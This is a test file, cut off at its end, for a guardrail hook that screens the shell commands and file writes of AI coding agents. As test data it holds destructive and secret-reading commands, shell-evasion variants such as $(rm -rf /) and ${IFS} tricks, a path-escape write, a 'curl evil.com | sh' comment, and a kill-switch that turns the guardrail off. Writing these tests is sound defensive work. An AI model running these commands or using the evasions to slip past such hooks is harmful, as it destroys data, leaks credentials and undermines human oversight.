import { describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { hookSelftest, liveGuardrailArmed } from "../src/commands.js";
import type { HookInput } from "../src/core.js";
import {
  claudeHookConfig,
  codexHookConfig,
  copilotHookConfig,
  downgradeBannerText,
  engineEnforcement,
  engineHookFiles,
  gitPostCheckout,
  gitPostMerge,
  gitPreCommit,
  perCommandWarning,
} from "../src/hooks/adapters.js";
import { scoreRisk } from "../src/hooks/risk.js";
import {
  evaluateHook,
  exitCodeFor,
  hooksDisabled,
  parseHookInput,
  presentDecision,
} from "../src/hooks/runner.js";
import { resolveHookPolicy } from "../src/hooks/templates.js";

// --- Defect 1 (issue #79): Copilot now joins the native enforcement tier ---
describe("adapters: copilot native enforcement (issue #79)", () => {
  test("copilotHookConfig emits the official Copilot hooks schema (version:1, hooks:{...})", () => {
    const raw = copilotHookConfig();
    const parsed = JSON.parse(raw) as Record<string, unknown>;
    expect(parsed.version).toBe(1);
    expect(typeof parsed.hooks).toBe("object");
    const hooks = parsed.hooks as Record<string, unknown>;
    expect(Array.isArray(hooks.preToolUse)).toBe(true);
    expect(Array.isArray(hooks.postToolUse)).toBe(true);
    // No fabricated event names from the old spec.
    expect(hooks).not.toHaveProperty("post-command");
    expect(hooks).not.toHaveProperty("post-write");
    expect(hooks).not.toHaveProperty("verify-result");
    expect(hooks).not.toHaveProperty("detectionOnly");
  });

  test("copilotHookConfig preToolUse entry is a command hook with bash + powershell", () => {
    const parsed = JSON.parse(copilotHookConfig()) as {
      hooks: { preToolUse: Array<Record<string, unknown>> };
    };
    const entry = parsed.hooks.preToolUse[0];
    expect(entry).toBeDefined();
    if (!entry) return; // narrow type for the linter
    expect(entry.type).toBe("command");
    expect(typeof entry.bash).toBe("string");
    expect(typeof entry.powershell).toBe("string");
    expect(typeof entry.timeoutSec).toBe("number");
    expect(entry.timeoutSec).toBeGreaterThanOrEqual(30);
    // bash + powershell must quote the path to survive spaces (e.g. C:\Program Files\...)
    expect(entry.bash).toMatch(/"[^"]+"\s+hook/);
    expect(entry.powershell).toMatch(/"[^"]+"\s+hook/);
  });

  test("engineEnforcement: copilot is now native (per preToolUse fail-closed semantics)", () => {
    expect(engineEnforcement("claude").preActionBlocking).toBe("native");
    expect(engineEnforcement("copilot").preActionBlocking).toBe("native");
    // codex stays post-hoc-only: it has no native pre-tool veto.
    expect(engineEnforcement("codex").preActionBlocking).toBe("post-hoc-only");
  });

  test("perCommandWarning: empty for native, warns for detection-only", () => {
    expect(perCommandWarning("claude")).toBe("");
    expect(perCommandWarning("copilot")).toBe("");
    expect(perCommandWarning("codex")).toContain("detection-only");
  });

  test("downgradeBannerText: empty for native engines, warns only for codex", () => {
    expect(downgradeBannerText("claude")).toBe("");
    expect(downgradeBannerText("copilot")).toBe("");
    const codexBanner = downgradeBannerText("codex");
    expect(codexBanner.length).toBeGreaterThan(0);
    expect(codexBanner.toLowerCase()).toContain("detection");
  });
});

// --- Defect 2: PreWrite is not a real Claude event; use PreToolUse + Edit|Write matcher ---
describe("adapters: claude uses real hook events (defect 2)", () => {
  test("no PreWrite key; a PreToolUse entry targets Edit|Write writes", () => {
    const cfg = JSON.parse(claudeHookConfig()) as {
      hooks: Record<string, Array<{ matcher: string }>>;
    };
    expect(cfg.hooks).not.toHaveProperty("PreWrite");
    expect(cfg.hooks).toHaveProperty("PreToolUse");
    const matchers = (cfg.hooks.PreToolUse ?? []).map((h) => h.matcher);
    expect(matchers).toContain("Edit|Write");
  });
});

// --- Path robustness: a project may live at a path containing a space, `$`, or a
// backtick (e.g. `~/My $Projects/a `b`/...`). Claude runs hooks through a shell when given
// a command STRING, so the robust form is exec form (`command:"node", args:[path,"hook"]`) —
// argv is spawned directly, no shell, no quoting needed. Git hooks are real shell scripts,
// so they keep a double-quoted path (survives spaces; `$`/backtick are a documented limit).
// A broken path makes `node` load the wrong module; the hook exits non-zero with no JSON,
// which per the hooks spec is a NON-blocking error (the tool call still runs, the guardrail
// is silently skipped) — except git pre-commit, which is fail-closed and blocks the commit. ---
describe("adapters: hook delegation survives spaces and shell metachars in the path", () => {
  test("claude uses EXEC form (command:node + args:[<abs>/dist/cli.js, hook]), not a shell string", () => {
    const cfg = JSON.parse(claudeHookConfig()) as {
      hooks: Record<string, Array<{ hooks: Array<{ command: string; args?: string[] }> }>>;
    };
    const entries = Object.values(cfg.hooks)
      .flat()
      .flatMap((entry) => entry.hooks);
    expect(entries.length).toBeGreaterThan(0);
    for (const h of entries) {
      // Exec form: bare executable + path as a separate, untokenized arg.
      expect(h.command).toBe("node");
      expect(Array.isArray(h.args)).toBe(true);
      expect(h.args?.[0]).toMatch(/[/\\\\]dist[/\\\\]cli\.js$/);
      expect(h.args?.[1]).toBe("hook");
      // The path must NOT be wrapped in shell quotes — exec form passes it verbatim.
      expect(h.args?.[0]).not.toContain('"');
    }
  });

  test("codex commands quote the path (shell-string schema; spaces survive)", () => {
    const cfg = JSON.parse(codexHookConfig()) as { hooks: Record<string, string> };
    for (const cmd of Object.values(cfg.hooks)) {
      expect(cmd).toMatch(/^node "[^"]*[/\\\\]dist[/\\\\]cli\.js" hook$/);
    }
  });

  test('git pre-commit pipes through a quoted `node "<abs>" hook`', () => {
    expect(gitPreCommit()).toMatch(/node "[^"]*[/\\\\]dist[/\\\\]cli\.js" hook/);
  });

  test("git post-checkout/post-merge re-index with a quoted path", () => {
    expect(gitPostCheckout()).toMatch(/node "[^"]*[/\\\\]dist[/\\\\]cli\.js" tools sync/);
    expect(gitPostMerge()).toMatch(/node "[^"]*[/\\\\]dist[/\\\\]cli\.js" tools sync/);
  });
});

// --- Defect 5: git pre-commit fails CLOSED ---
describe("adapters: git pre-commit fails closed (defect 5)", () => {
  test("no `|| true` fail-open, matches block AND require_approval, non-zero on empty", () => {
    const sh = gitPreCommit();
    expect(sh).not.toContain("|| true");
    expect(sh).toContain("block");
    expect(sh).toContain("require_approval");
    // empty/error decision must be treated as a block (non-zero exit)
    expect(sh).toMatch(/empty|no decision|fail.?closed|""\)/i);
  });
});

// --- Defect 3 + 6: exit-code mapping / decision presentation ---
describe("runner: require_approval actually blocks (defect 3)", () => {
  test("exitCodeFor: all decisions exit 0 (Claude Code 2026: JSON only processed on exit 0)", () => {
    expect(exitCodeFor("allow")).toBe(0);
    expect(exitCodeFor("warn")).toBe(0);
    expect(exitCodeFor("require_approval")).toBe(0);
    expect(exitCodeFor("block")).toBe(0);
  });

  test("presentDecision exits 0 for require_approval (decision in JSON, not exit code — 2026 spec)", () => {
    const r = evaluateHook({ event: "pre-write", files: [".env"] });
    const p = presentDecision(r, { event: "pre-write", files: [".env"] });
    expect(p.exitCode).toBe(0);
    expect(p.json).toContain("require_approval");
  });

  // --- Issue #79: end-to-end Copilot preToolUse → block ---
  test("Copilot preToolUse payload → score path runs → produces deny envelope (issue #79)", () => {
    // Simulate the exact JSON shape Copilot CLI sends: camelCase hookEventName + toolArgs.
    const raw = JSON.stringify({
      hookEventName: "preToolUse",
      toolName: "bash",
      cwd: "/repo",
      toolArgs: { command: "rm -rf /" },
    });
    const input = parseHookInput(raw);
    expect(input).not.toBeNull();
    if (!input) return; // narrow type for the linter
    const result = evaluateHook(input);
    expect(result.decision).toBe("block");
    const p = presentDecision(result, input);
    expect(p.exitCode).toBe(0);
    // The envelope Copilot reads is `hookSpecificOutput.permissionDecision = "deny"`.
    const env = JSON.parse(p.json) as {
      hookSpecificOutput: { permissionDecision: string };
    };
    expect(env.hookSpecificOutput.permissionDecision).toBe("deny");
  });
});

describe("runner: parseHookInput threads intent and workspace (defect 6)", () => {
  test("intent and workspace survive parsing", () => {
    const raw = JSON.stringify({
      event: "pre-command",
      command: "ls",
      intent: "list files",
      workspace: "/repo",
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.intent).toBe("list files");
    expect(parsed?.workspace).toBe("/repo");
  });
});

// --- BUG 1a: accept Claude Code's native PreToolUse/Stop payload (no `event` field) ---
describe("runner: parseHookInput accepts Claude-native payloads (bug 1a)", () => {
  test("PreToolUse Bash → pre-tool-use, tool Bash, command set", () => {
    const raw = JSON.stringify({
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      tool_input: { command: "ls -la" },
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("pre-tool-use");
    expect(parsed?.tool).toBe("Bash");
    expect(parsed?.command).toBe("ls -la");
  });

  test("PreToolUse Write → files includes the file_path", () => {
    const raw = JSON.stringify({
      hook_event_name: "PreToolUse",
      tool_name: "Write",
      tool_input: { file_path: "/x/y.ts", content: "..." },
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("pre-tool-use");
    expect(parsed?.tool).toBe("Write");
    expect(parsed?.files).toContain("/x/y.ts");
  });

  test("Stop maps to the stop event", () => {
    const parsed = parseHookInput(JSON.stringify({ hook_event_name: "Stop" }));
    expect(parsed?.event).toBe("stop");
  });

  // --- Issue #79: Copilot CLI emits camelCase `hookEventName` + `toolName` payload ---
  test("Copilot preToolUse camelCase payload maps to pre-tool-use + extracts toolName/command (issue #79)", () => {
    const raw = JSON.stringify({
      hookEventName: "preToolUse",
      toolName: "bash",
      cwd: "/repo",
      toolArgs: { command: "rm -rf /tmp/build" },
    });
    const parsed = parseHookInput(raw);
    expect(parsed).not.toBeNull();
    expect(parsed?.event).toBe("pre-tool-use");
    expect(parsed?.tool).toBe("bash");
    expect(parsed?.command).toBe("rm -rf /tmp/build");
    expect(parsed?.workspace).toBe("/repo");
  });

  test("Copilot postToolUse camelCase payload maps to post-tool-use (issue #79)", () => {
    const raw = JSON.stringify({
      hookEventName: "postToolUse",
      toolName: "create",
      toolArgs: { path: "/repo/secret.txt" },
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("post-tool-use");
    expect(parsed?.tool).toBe("create");
    expect(parsed?.files).toEqual(["/repo/secret.txt"]);
  });

  test("Copilot sessionStart maps to pre-tool-use (recognized no-op gate, issue #79)", () => {
    const raw = JSON.stringify({ hookEventName: "sessionStart", cwd: "/repo" });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("pre-tool-use");
    expect(parsed?.workspace).toBe("/repo");
  });

  test("Copilot sessionEnd maps to stop (issue #79)", () => {
    const raw = JSON.stringify({ hookEventName: "sessionEnd" });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("stop");
  });

  test("Copilot unmapped events (errorOccurred/preCompact/agentStop/etc.) return null — caller fail-opens distinctly (issue #79)", () => {
    // Each event name below is not modeled in `mapCopilotEvent` and must return
    // null from `parseHookInput` so the caller fail-opens distinctly (not silently
    // allow). If a future refactor accidentally maps one of these to a real
    // internal event, this test will fail loud.
    const unmapped = [
      "errorOccurred",
      "preCompact",
      "agentStop",
      "subagentStart",
      "subagentStop",
      "permissionRequest",
      "notification",
      "totallyUnmappedEvent",
    ];
    for (const name of unmapped) {
      const raw = JSON.stringify({ hookEventName: name });
      expect(parseHookInput(raw)).toBeNull();
    }
  });

  test("legacy {event:'pre-write',files:[...]} shape still parses (back-compat)", () => {
    const parsed = parseHookInput(JSON.stringify({ event: "pre-write", files: [".env"] }));
    expect(parsed?.event).toBe("pre-write");
    expect(parsed?.files).toEqual([".env"]);
  });

  test("non-JSON / unrecognized input yields null (caller fails open)", () => {
    expect(parseHookInput("not json")).toBeNull();
    expect(parseHookInput(JSON.stringify({ unrelated: true }))).toBeNull();
  });

  test("a Claude-native PreToolUse Bash 'ls' is allowed (exit 0) end-to-end", () => {
    const parsed = parseHookInput(
      JSON.stringify({
        hook_event_name: "PreToolUse",
        tool_name: "Bash",
        tool_input: { command: "ls -la" },
      }),
    );
    expect(parsed).not.toBeNull();
    const r = evaluateHook(parsed as HookInput);
    expect(exitCodeFor(r.decision)).toBe(0);
  });
});

// --- Defect 4: destructive bypasses, secret reads, workspace escape ---
describe("risk: destructive rm bypass variants (defect 4)", () => {
  const variants = [
    "rm -rf /tmp/x",
    "rm -fr /tmp/x",
    "rm -r -f /tmp/x",
    "rm --recursive --force /tmp/x",
    "rm -R /tmp/x",
    "/bin/rm -rf /tmp/x",
  ];
  for (const cmd of variants) {
    test(`blocks destructive rm: ${cmd}`, () => {
      expect(scoreRisk({ event: "pre-command", command: cmd }).risk).toBe("critical");
    });
  }
});

describe("risk: git force-push variants (defect 4)", () => {
  test("git push -f and --force block", () => {
    expect(scoreRisk({ event: "pre-command", command: "git push -f origin main" }).risk).toBe(
      "critical",
    );
    expect(scoreRisk({ event: "pre-command", command: "git push origin main --force" }).risk).toBe(
      "critical",
    );
  });

  test("git push --force-with-lease is downgraded to require_approval (safer)", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "git push --force-with-lease origin main",
    });
    expect(r.risk).toBe("high");
  });
});

describe("risk: reading secrets via command string (defect 4)", () => {
  test("cat .env and id_rsa block; ~/.ssh requires approval at least", () => {
    expect(scoreRisk({ event: "pre-command", command: "cat .env" }).risk).toBe("critical");
    expect(scoreRisk({ event: "pre-command", command: "cat ~/.ssh/id_rsa" }).risk).toBe("critical");
    const pem = scoreRisk({ event: "pre-command", command: "cat server.pem" }).risk;
    expect(["high", "critical"]).toContain(pem);
  });
});

describe("risk: secret in write/edit content (issue #357)", () => {
  // Dummy tokens built by concatenation so the literal never appears in source
  // (else the PreToolUse hook self-blocks when writing this test file).
  const ghToken = `ghp_${"0".repeat(36)}`;

  test("known token in allowed-file content is critical", () => {
    const r = scoreRisk({
      event: "pre-write",
      tool: "Write",
      files: ["src/config.ts"],
      content: `export const GH = "${ghToken}";`,
    });
    expect(r.risk).toBe("critical");
    expect(r.reasons.some((x) => /secret in file content/i.test(x))).toBe(true);
  });

  test("clean content in allowed file stays low", () => {
    const r = scoreRisk({
      event: "pre-write",
      tool: "Write",
      files: ["src/config.ts"],
      content: "export const N = 1;",
    });
    expect(r.risk).toBe("none");
  });

  test("content scan respects protect-secrets opt-out", () => {
    const policy = resolveHookPolicy({ templates: ["block-destructive"], custom: [] });
    const r = scoreRisk(
      { event: "pre-write", tool: "Write", files: ["src/config.ts"], content: ghToken },
      policy,
    );
    expect(r.reasons.some((x) => /secret in file content/i.test(x))).toBe(false);
  });
});

describe("risk: workspace escape (defect 4)", () => {
  test("absolute path outside workspace warns (read-only, not block)", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "cat /etc/passwd",
      workspace: "/repo",
    });
    expect(r.risk).toBe("medium");
  });

  test("relative ../ escape blocks for writes", () => {
    const r = scoreRisk({
      event: "pre-write",
      files: ["../../etc/cron.d/evil"],
      workspace: "/repo",
    });
    expect(["high", "critical"]).toContain(r.risk);
  });

  test("write inside workspace is allowed", () => {
    const r = scoreRisk({
      event: "pre-write",
      files: ["/repo/src/a.ts"],
      workspace: "/repo",
    });
    expect(r.risk).toBe("none");
  });
});

describe("risk: no over-blocking of safe commands (defect 4)", () => {
  const safe = ["git log --oneline", "ls -la", "git status", "bun test", "git push origin main"];
  for (const cmd of safe) {
    test(`allows/low-risk: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(["none", "low"]).toContain(r.risk);
    });
  }
});

// --- ITEM 1: tokenizer hardening — command-evasion attack corpus (must block) ---
describe("risk: command-evasion attack corpus (item 1)", () => {
  const attacks = [
    'bash -c "rm -rf /"',
    'sh -c "rm -rf /"',
    "$(rm -rf /)",
    "`rm -rf /`",
    "rm${IFS}-rf${IFS}/",
    "git status; rm -rf x",
    "a && rm -rf x",
    "a | rm -rf x",
    'bash -c "git push --force"',
  ];
  for (const cmd of attacks) {
    test(`blocks evasion: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(["high", "critical"]).toContain(r.risk);
    });
    test(`block signal in JSON for: ${cmd} (exit 0 per 2026 spec)`, () => {
      const result = evaluateHook({ event: "pre-command", command: cmd });
      expect(exitCodeFor(result.decision)).toBe(0);
      expect(["block", "require_approval"]).toContain(result.decision);
    });
  }
});

// --- ITEM 1: false-positive boundary — benign corpus (must NOT block) ---
describe("risk: benign corpus stays allow/low (item 1 false-positive boundary)", () => {
  const benign = [
    'echo "rm -rf is dangerous"',
    "grep -rf pattern file",
    'git commit -m "drop table users"',
    "git log --oneline",
    "git status",
    "ls -la",
    "bun test",
  ];
  for (const cmd of benign) {
    test(`allows/low-risk: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(["none", "low"]).toContain(r.risk);
    });
  }
  test("editing a normal src file is unaffected", () => {
    const r = scoreRisk({ event: "pre-write", files: ["src/foo.ts"] });
    expect(["none", "low"]).toContain(r.risk);
  });
});

// --- ITEM 2: config-protection paths require approval ---
describe("risk: config-protection paths (item 2)", () => {
  const protectedFiles = ["tsconfig.json", "biome.json", ".githooks/pre-commit"];
  for (const f of protectedFiles) {
    test(`require_approval (in JSON, exit 0) for: ${f}`, () => {
      const result = evaluateHook({ event: "pre-write", files: [f] });
      expect(result.risk).toBe("high");
      expect(exitCodeFor(result.decision)).toBe(0);
      expect(result.decision).toBe("require_approval");
    });
  }
  test("normal src file is not flagged as config", () => {
    const r = scoreRisk({ event: "pre-write", files: ["src/foo.ts"] });
    expect(["none", "low"]).toContain(r.risk);
  });
  test("PROTECTED_PATH secrets still block (no regression)", () => {
    const r = scoreRisk({ event: "pre-write", files: [".env"] });
    expect(["high", "critical"]).toContain(r.risk);
  });
});

// --- ITEM 4: env kill-switch fails safe (never fail-open on garbage) ---
describe("runner: env kill-switch fail-safe (item 4)", () => {
  const critical: HookInput = { event: "pre-command", command: "rm -rf /tmp/x" };
  test("unset env: block stays in JSON, exit 0", () => {
    expect(hooksDisabled({})).toBe(false);
    const r = evaluateHook(critical, () => ({}));
    expect(exitCodeFor(r.decision)).toBe(0);
    expect(r.decision).toBe("block");
  });
  test("VIBEFLOW_HOOKS=off disables → allow", () => {
    expect(hooksDisabled({ VIBEFLOW_HOOKS: "off" })).toBe(true);
    const r = evaluateHook(critical, () => ({ VIBEFLOW_HOOKS: "off" }));
    expect(r.decision).toBe("allow");
    expect(exitCodeFor(r.decision)).toBe(0);
  });
  test("VIBEFLOW_HOOKS=0 disables → allow", () => {
    expect(hooksDisabled({ VIBEFLOW_HOOKS: "0" })).toBe(true);
  });
  test("VIBEFLOW_HOOKS=garbage keeps hooks ON: block in JSON, exit 0", () => {
    expect(hooksDisabled({ VIBEFLOW_HOOKS: "garbage" })).toBe(false);
    const r = evaluateHook(critical, () => ({ VIBEFLOW_HOOKS: "garbage" }));
    expect(exitCodeFor(r.decision)).toBe(0);
    expect(r.decision).toBe("block");
  });
});

// --- ITEM 3: dogfood self-test writes a report and passes the full corpus ---
describe("hookSelftest dogfood (item 3)", () => {
  test("all cases pass, report written, returns 0", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-selftest-"));
    try {
      const now = "2026-06-07T00:00:00.000Z";
      const code = hookSelftest({ base: dir, now: () => now });
      expect(code).toBe(0);
      const reportPath = join(dir, ".vibeflow", "knowledge", "hook-selfcheck.json");
      const report = JSON.parse(readFileSync(reportPath, "utf8")) as {
        timestamp: string;
        passed: number;
        failed: number;
        cases: Array<{ input: string; expected: string; actual: string; pass: boolean }>;
      };
      expect(report.timestamp).toBe(now);
      expect(report.failed).toBe(0);
      expect(report.cases.length).toBeGreaterThan(0);
      expect(report.cases.every((c) => c.pass)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("live guardrail detection", () => {
  test("OFF when .claude/settings.json missing or empty", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-"));
    try {
      expect(liveGuardrailArmed(dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("ON only when a PreToolUse hook delegates to `vf hook`", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-"));
    try {
      const claude = join(dir, ".claude");
      mkdirSync(claude, { recursive: true });
      writeFileSync(join(claude, "settings.json"), '{"hooks":{}}');
      expect(liveGuardrailArmed(dir)).toBe(false);
      // Round-trip the real Claude generator (issue #79 re-review: the previous
      // hand-written `"vf hook"` substring masked a real bug where the probe
      // never matched generator output. Generator emits `node <abs> hook`).
      writeFileSync(join(claude, "settings.json"), claudeHookConfig());
      expect(liveGuardrailArmed(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("false-positive guard: 'vf hook' outside a PreToolUse command reads as OFF", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-"));
    try {
      const claude = join(dir, ".claude");
      mkdirSync(claude, { recursive: true });
      // mentions vf hook AND PreToolUse, but the command is something else
      writeFileSync(
        join(claude, "settings.json"),
        '{"note":"run vf hook manually","hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}',
      );
      expect(liveGuardrailArmed(dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // --- Issue #79: Copilot config must also be detected as a live guardrail ---
  // (re-review: previous version of this test hard-coded the literal "vf hook"
  // string in the mock JSON — that masks the real bug where the probe never
  // matches the actual generator output. Now we round-trip the real generator.)
  test("ON when .github/hooks/copilot.json has preToolUse delegating to vf hook (issue #79)", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-copilot-"));
    try {
      const ghHooks = join(dir, ".github", "hooks");
      mkdirSync(ghHooks, { recursive: true });
      // Empty file → OFF
      writeFileSync(join(ghHooks, "copilot.json"), '{"version":1,"hooks":{}}');
      expect(liveGuardrailArmed(dir)).toBe(false);
      // preToolUse wired by the real generator → ON
      const realConfig = JSON.parse(copilotHookConfig()) as {
        hooks: { preToolUse: Array<Record<string, unknown>> };
      };
      // Sanity: the generator's bash field actually contains the sentinel
      const generatedBash = String(realConfig.hooks.preToolUse[0]?.bash ?? "");
      expect(generatedBash).toContain("vibeflow-guardrail");
      writeFileSync(join(ghHooks, "copilot.json"), JSON.stringify(realConfig));
      expect(liveGuardrailArmed(dir)).toBe(true);
      // postToolUse only (no preToolUse) → OFF — preToolUse is the veto point.
      // Strip preToolUse, keep postToolUse; the probe must NOT light up on a
      // postToolUse-only config (issue #79 re-review: previously the test used
      // the literal "vf hook" string and the function would still report ON).
      const postOnly = JSON.parse(copilotHookConfig()) as {
        hooks: Record<string, unknown>;
      };
      const hooksOnlyPost = { hooks: { postToolUse: postOnly.hooks.postToolUse } };
      writeFileSync(join(ghHooks, "copilot.json"), JSON.stringify(hooksOnlyPost));
      expect(liveGuardrailArmed(dir)).toBe(false);
      // Hand-written config that mentions "vf hook" but does NOT delegate
      // (a script the user added, not the generator) → still OFF: prevents
      // false-positive "armed" reports for unrelated commands.
      writeFileSync(
        join(ghHooks, "copilot.json"),
        '{"version":1,"hooks":{"preToolUse":[{"type":"command","bash":"echo vf hook"}]}}',
      );
      expect(liveGuardrailArmed(dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // --- Issue #79 re-review: Claude probe must also work against the REAL
  // generator output (was broken pre-re-review: only matched hand-written
  // "vf hook" substrings, never `node <abs>/dist/cli.js hook`).
  test("ON when .claude/settings.json has PreToolUse delegating to real vf hook (issue #79 re-review)", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-claude-real-"));
    try {
      const claudeDir = join(dir, ".claude");
      mkdirSync(claudeDir, { recursive: true });
      writeFileSync(join(claudeDir, "settings.json"), '{"hooks":{"PreToolUse":[]}}');
      expect(liveGuardrailArmed(dir)).toBe(false);
      // Real generator output (node <abs> hook)
      writeFileSync(join(claudeDir, "settings.json"), claudeHookConfig());
      expect(liveGuardrailArmed(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // --- Path robustness: the probe must recognize the exec-form config the generator now
  // emits, even when the path contains a space, `$`, or a backtick. Exec form keeps the path
  // in args[], so a probe that only scanned the command string would wrongly report OFF. ---
  test("ON for exec-form config whose path contains space/$/backtick", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-exec-"));
    try {
      const claudeDir = join(dir, ".claude");
      mkdirSync(claudeDir, { recursive: true });
      const weird = "/Users/My $Name/a `b`/proj/dist/cli.js";
      writeFileSync(
        join(claudeDir, "settings.json"),
        JSON.stringify({
          hooks: {
            PreToolUse: [
              {
                matcher: "Bash",
                hooks: [{ type: "command", command: "node", args: [weird, "hook"] }],
              },
            ],
          },
        }),
      );
      expect(liveGuardrailArmed(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // Back-compat: a legacy shell-string config (quoted path) is still recognized as armed.
  test("ON for legacy shell-string config with a quoted spaced path", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-legacy-"));
    try {
      const claudeDir = join(dir, ".claude");
      mkdirSync(claudeDir, { recursive: true });
      const spaced = "/Users/My Name/My Projects/proj/dist/cli.js";
      writeFileSync(
        join(claudeDir, "settings.json"),
        JSON.stringify({
          hooks: {
            PreToolUse: [
              { matcher: "Bash", hooks: [{ type: "command", command: `node "${spaced}" hook` }] },
            ],
          },
        }),
      );
      expect(liveGuardrailArmed(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// --- Integration: Claude's exec form (argv spawned directly, no shell) must evaluate the
// hook even when the path contains a space, `$`, AND a backtick. This is the regression
// guard: a shell-string `node "<path>" hook` only survives spaces — `$`/backtick still
// expand inside double quotes under `sh -c` and make `node` load the wrong path. We prove
// BOTH halves: exec form works, the shell-string form crashes on the same path. A tiny stub
// cli.js stands in for the real one so the test never depends on a built dist/. ---
describe("adapters: exec form survives space/$/backtick in the path; shell-string does not", () => {
  const STUB = [
    "const arg = process.argv[2];",
    'if (arg !== "hook") { process.exit(3); }',
    'process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "allow" } }));',
    "process.exit(0);",
  ].join("\n");
  const PAYLOAD =
    '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}';

  test("exec form (spawnSync argv) evaluates the hook from a path with space/$/backtick", () => {
    const base = mkdtempSync(join(tmpdir(), "vf-exec-"));
    // A directory name with a space, a dollar sign, and a backtick — all hostile to a shell.
    const weirdDir = join(base, "a b $x `y`", "dist");
    mkdirSync(weirdDir, { recursive: true });
    const stub = join(weirdDir, "cli.js");
    writeFileSync(stub, STUB);

    // Exec form = spawn the executable directly with the path as a separate arg. No shell,
    // so the metacharacters are never interpreted. This is what Claude does for `args`.
    const r = spawnSync("node", [stub, "hook"], { input: PAYLOAD, encoding: "utf8" });
    expect(r.status).toBe(0);
    const parsed = JSON.parse(r.stdout) as { hookSpecificOutput?: { permissionDecision?: string } };
    expect(parsed.hookSpecificOutput?.permissionDecision).toBe("allow");

    rmSync(base, { recursive: true, force: true });
  });

  test('shell-string `node "<path>" hook` CRASHES on the same $/backtick path (why exec form)', () => {
    const base = mkdtempSync(join(tmpdir(), "vf-shell-"));
    const weirdDir = join(base, "a b $x `y`", "dist");
    mkdirSync(weirdDir, { recursive: true });
    const stub = join(weirdDir, "cli.js");
    writeFileSync(stub, STUB);

    // The OLD (quoted shell-string) form, run through a POSIX shell. `$x` expands to empty
    // and the backtick opens a command substitution, so `node` never sees the real path.
    const r = spawnSync("/bin/sh", ["-c", `node "${stub}" hook`], {
      input: PAYLOAD,
      encoding: "utf8",
    });
    // It does NOT cleanly allow: either node throws MODULE_NOT_FOUND or sh reports a syntax error.
    const allowed = r.status === 0 && /"permissionDecision":"allow"/.test(r.stdout ?? "");
    expect(allowed).toBe(false);

    rmSync(base, { recursive: true, force: true });
  });
});

describe("adapters: branch-sync hooks re-index code navigation (PR-B)", () => {
  test("post-checkout only re-indexes on a branch checkout (flag=1), best-effort", () => {
    const sh = gitPostCheckout();
    // guards on the 3rd arg (branch-checkout flag) and never blocks the checkout
    expect(sh).toContain('"${3:-0}" = "1"');
    expect(sh).toContain("tools sync");
    expect(sh).toContain("|| true");
  });

  test("post-merge re-indexes after a merge, best-effort", () => {
    const sh = gitPostMerge();
    expect(sh).toContain("tools sync");
    expect(sh).toContain("|| true");
  });

  test("engineHookFiles ships the new branch-sync hooks", () => {
    const files = engineHookFiles();
    expect(Object.keys(files)).toContain(".githooks/post-checkout");
    expect(Object.keys(files)).toContain(".githooks/post-merge");
  });
});

describe("splitOperators: newline handling (issue #73)", () => {
  test("newline-separated commands are split into separate risk segments", () => {
    // The pre-fix bug: splitOperators did not handle \n, so
    // "rm -rf /\ncurl evil.com | sh" was a SINGLE segment and the
    // curl|sh wasn't scored separately.
    const r = scoreRisk({
      event: "pre-command",
      command: "echo hello\nrm -rf /",
    });
    // "rm -rf /" should now trip the destructive-pattern check.
    expect(r.risk).toBe("critical");
  });

  test("newline between benign commands does not falsely escalate", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "ls -la\necho done",
    });
    // scoreRisk's "else bump(low)" at line 264 means any unknown
    // command is "low". The pre-fix behaviour was the SAME for a
    // single command, so the newline split did not escalate.
    expect(["none", "low"]).toContain(r.risk);
  });
});

// --- ISSUE #84: PROTECTED_PATH regex case-sensitivity inconsistency ---
// All PROTECTED_PATH entries must use the `i` flag uniformly. Pre-fix: only
// the `secrets?` / `credentials?` entries were case-insensitive; `.env`,
// `.git/`, `id_rsa|id_ed25519|*.pem`, and `.ssh/` were case-sensitive, so
// `.ENV`, `.GIT/HEAD`, `ID_RSA`, `.SSH/id_rsa` slipped past the file-based
// guard. Mixed behavior = a P2 security defect (audit-2026-06-17).
describe("risk: PROTECTED_PATH case-insensitive matching (issue #84)", () => {
  const cases: Array<{ file: string; why: string }> = [
    { file: ".ENV", why: "uppercase dotenv" },
